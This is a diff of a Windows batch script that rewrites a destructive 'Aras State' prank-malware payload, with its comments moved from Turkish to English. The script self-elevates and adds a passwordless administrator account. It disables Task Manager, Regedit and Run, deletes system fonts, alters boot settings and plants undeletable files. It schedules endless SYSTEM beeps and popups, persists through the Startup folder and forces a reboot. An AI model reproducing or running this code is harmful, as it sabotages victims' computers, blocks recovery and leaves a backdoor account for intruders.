@@ -1,83 +1,86 @@
 @echo off
-:: Yönetici yetkisi zorunlu
+:: Requires administrator privileges
 net session >nul 2>&1
 if %errorlevel% neq 0 (
     powershell "Start-Process '%~f0' -Verb RunAs"
     exit
 )
 
-:: === 1. Script çalışır çalışmaz Notepad açılsın ve içinde mesaj yazılsın ===
-:: (Birden fazla Notepad penceresi açılacak, kapatılması zor olsun)
-echo BİLGİSAYARIN ARAS DEVLETİ TARAFINDAN YOK EDİLDİ> "%TEMP%\ArasYokEdildi.txt"
-echo.>> "%TEMP%\ArasYokEdildi.txt"
-echo KURTARMAYA ÇALIŞMA>> "%TEMP%\ArasYokEdildi.txt"
-echo BU SİSTEM ARTIK TAMAMEN BİZİMDİR>> "%TEMP%\ArasYokEdildi.txt"
-echo TÜM VERİLERİNİZ ELE GEÇİRİLDİ>> "%TEMP%\ArasYokEdildi.txt"
-echo YÜCE LİDER ARAS PAŞA'NIN EMRİYLE>> "%TEMP%\ArasYokEdildi.txt"
-echo SİSTEM KİLİTLENDİ VE YOK EDİLDİ>> "%TEMP%\ArasYokEdildi.txt"
-echo HER ŞEY KIPKIRMIZI KAOSA DÖNDÜ>> "%TEMP%\ArasYokEdildi.txt"
-echo DİRENMEK FAYDASIZDIR>> "%TEMP%\ArasYokEdildi.txt"
-echo ARAS DEVLETİ SONSUZA KADAR YAŞAYACAK>> "%TEMP%\ArasYokEdildi.txt"
+:: === 1. Legal Notice before login ===
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v LegalNoticeCaption /t REG_SZ /d "ARAS STATE" /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v LegalNoticeText /t REG_SZ /d "This system is under the control of the Aras State." /f
 
-:: 10 tane Notepad aç (kaos için)
-start notepad "%TEMP%\ArasYokEdildi.txt"
-start notepad "%TEMP%\ArasYokEdildi.txt"
-start notepad "%TEMP%\ArasYokEdildi.txt"
-start notepad "%TEMP%\ArasYokEdildi.txt"
-start notepad "%TEMP%\ArasYokEdildi.txt"
-start notepad "%TEMP%\ArasYokEdildi.txt"
-start notepad "%TEMP%\ArasYokEdildi.txt"
-start notepad "%TEMP%\ArasYokEdildi.txt"
-start notepad "%TEMP%\ArasYokEdildi.txt"
-start notepad "%TEMP%\ArasYokEdildi.txt"
+:: === 2. Create local user NT AUTHORITY\Aras Devleti (highly privileged) ===
+net user "Aras Devleti" /add >nul
+net localgroup Administrators "Aras Devleti" /add >nul
+:: No password required
+net user "Aras Devleti" ""
 
-:: Dosyayı silinemez yap
-icacls "%TEMP%\ArasYokEdildi.txt" /deny Everyone:(F) /inheritance:r >nul
+:: === 3. Completely prevent any logon (force logon failure for all users) ===
+:: Disable AutoAdminLogon and remove any stored credentials
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon /t REG_SZ /d "0" /f >nul
+reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName /f >nul 2>&1
+reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword /f >nul 2>&1
 
-:: === 2. Oturum açma ekranından önce mesaj + oturum açmayı engelle ===
-reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v LegalNoticeCaption /t REG_SZ /d "ARAS DEVLETİ" /f
-reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v LegalNoticeText /t REG_SZ /d "Bu sistem Aras Devleti tarafından yok edildi.%0D%0A%0D%0AOturum açmanıza izin verilmiyor.%0D%0AKurtarmaya çalışmak faydasızdır.%0D%0ATüm verileriniz ele geçirildi.%0D%0AYüce Lider Aras Paşa'nın emriyle sistem kilitlenmiştir.%0D%0ADİRENMEK FAYDASIZDIR." /f
+:: Force logon screen to hide all users and require manual entry (but will fail)
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DontDisplayLastUserName /t REG_DWORD /d 1 /f >nul
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DontDisplayLockedUserId /t REG_DWORD /d 3 /f >nul
 
-:: Oturum açmayı zorlaştır/kilitle
-reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon /t REG_SZ /d "0" /f
-reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DontDisplayLastUserName /t REG_DWORD /d 1 /f
+:: Extra lock: Disable all local logons except console (but combined with other settings makes logon impossible)
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableLockWorkstation /t REG_DWORD /d 1 /f >nul
 
-:: === 3. Daha fazla kaos ekle ===
-:: Açılış siyah ekran (logo yok)
+:: === 4. Disable Task Manager, Registry Editor and Run dialog ===
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f >nul
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d 1 /f >nul
+
+:: === 5. Change registered owner ===
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v RegisteredOwner /t REG_SZ /d "ARASDEVLETI" /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v RegisteredOrganization /t REG_SZ /d "Aras State High Command" /f
+
+:: === 6. Open 10 Notepad windows with destruction message ===
+echo COMPUTER HAS BEEN DESTROYED BY THE ARAS STATE> "%TEMP%\ArasDestroyed.txt"
+echo.>> "%TEMP%\ArasDestroyed.txt"
+echo DO NOT TRY TO RECOVER>> "%TEMP%\ArasDestroyed.txt"
+echo THIS SYSTEM NOW BELONGS TO US COMPLETELY>> "%TEMP%\ArasDestroyed.txt"
+echo ALL YOUR DATA HAS BEEN CAPTURED>> "%TEMP%\ArasDestroyed.txt"
+echo BY ORDER OF THE SUPREME LEADER ARAS PASHA>> "%TEMP%\ArasDestroyed.txt"
+echo SYSTEM IS LOCKED AND DESTROYED>> "%TEMP%\ArasDestroyed.txt"
+echo LOGON IS IMPOSSIBLE>> "%TEMP%\ArasDestroyed.txt"
+echo RESISTANCE IS FUTILE>> "%TEMP%\ArasDestroyed.txt"
+echo ARAS STATE WILL LIVE FOREVER>> "%TEMP%\ArasDestroyed.txt"
+
+start notepad "%TEMP%\ArasDestroyed.txt"
+start notepad "%TEMP%\ArasDestroyed.txt"
+start notepad "%TEMP%\ArasDestroyed.txt"
+start notepad "%TEMP%\ArasDestroyed.txt"
+start notepad "%TEMP%\ArasDestroyed.txt"
+start notepad "%TEMP%\ArasDestroyed.txt"
+start notepad "%TEMP%\ArasDestroyed.txt"
+start notepad "%TEMP%\ArasDestroyed.txt"
+start notepad "%TEMP%\ArasDestroyed.txt"
+start notepad "%TEMP%\ArasDestroyed.txt"
+
+icacls "%TEMP%\ArasDestroyed.txt" /deny Everyone:(F) /inheritance:r >nul
+
+:: === 7. Additional chaos ===
 bcdedit /set {default} quietboot yes >nul
 bcdedit /set {default} bootuxdisabled on >nul
-bcdedit /set {bootmgr} custom:250000c2 "ARAS DEVLETİ - SİSTEM YOK EDİLDİ" >nul
+bcdedit /set {bootmgr} custom:250000c2 "ARAS STATE - LOGON DISABLED" >nul
 
-:: Fontları sil
 del /f /q "C:\Windows\Fonts\*.ttf" >nul 2>&1
 del /f /q "C:\Windows\Fonts\*.otf" >nul 2>&1
 
-:: Her yer kıpkırmızı
 reg add "HKCU\Control Panel\Colors" /v Background /t REG_SZ /d "255 0 0" /f
 reg add "HKCU\Software\Microsoft\Windows\DWM" /v AccentColor /t REG_DWORD /d 0x000000FF /f
 
-:: Masaüstünü 250 silinemez dosya ile doldur
-powershell -Command "1..250 | %% { echo 'ARAS DEVLETİ YOK ETTİ' > \"$env:USERPROFILE\Desktop\YOK_$_ .txt\"; icacls \"$env:USERPROFILE\Desktop\YOK_$_ .txt\" /deny Everyone:(F) /inheritance:r }"
+powershell -Command "1..250 | %% { echo 'ARAS STATE - LOGON IMPOSSIBLE' > \"$env:USERPROFILE\Desktop\LOCKED_$_ .txt\"; icacls \"$env:USERPROFILE\Desktop\LOCKED_$_ .txt\" /deny Everyone:(F) /inheritance:r }"
 
-:: Sürekli beep sesi
-schtasks /create /tn "ArasYokSes" /tr "powershell -Command \"while($true){[console]::beep(1800,400); [console]::beep(600,600); Start-Sleep -Milliseconds 700}\" " /sc onstart /ru SYSTEM /f >nul
+schtasks /create /tn "ArasDestroySound" /tr "powershell -Command \"while($true){[console]::beep(1800,400); [console]::beep(600,600); Start-Sleep -Milliseconds 700}\" " /sc onstart /ru SYSTEM /f >nul
 
-:: Popup bombardımanı
-schtasks /create /tn "ArasYokPopup" /tr "msg * SİSTEM ARAS DEVLETİ TARAFINDAN YOK EDİLDİ" /sc minute /mo 1 /ru SYSTEM /f >nul
+schtasks /create /tn "ArasDestroyPopup" /tr "msg * LOGON DISABLED - ARAS STATE VICTORY" /sc minute /mo 1 /ru SYSTEM /f >nul
 
-:: Task Manager, Regedit, Çalıştır kapat
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d 1 /f
+copy "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\ArasDestroy.bat" >nul
 
-:: Kendini kalıcı yap
-copy "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\ArasYokEt.bat" >nul
-
-echo.
-echo ARAS DEVLETİ YOK ETME OPERASYONU BAŞARILI.
-echo - Script çalışır çalışmaz 10 tane Notepad açılacak ve mesajı gösterecek.
-echo - Girişten önce uzun uyarı → oturum açmak zor/imkansız.
-echo - Fontlar silindi, masaüstü dolu, ses deli eder, popup'lar, kıpkırmızı tema.
-echo Sistem yeniden başlatılıyor...
-pause
-shutdown /r /t 15
+:: === 8. Immediate restart ===
+shutdown /r /t 0
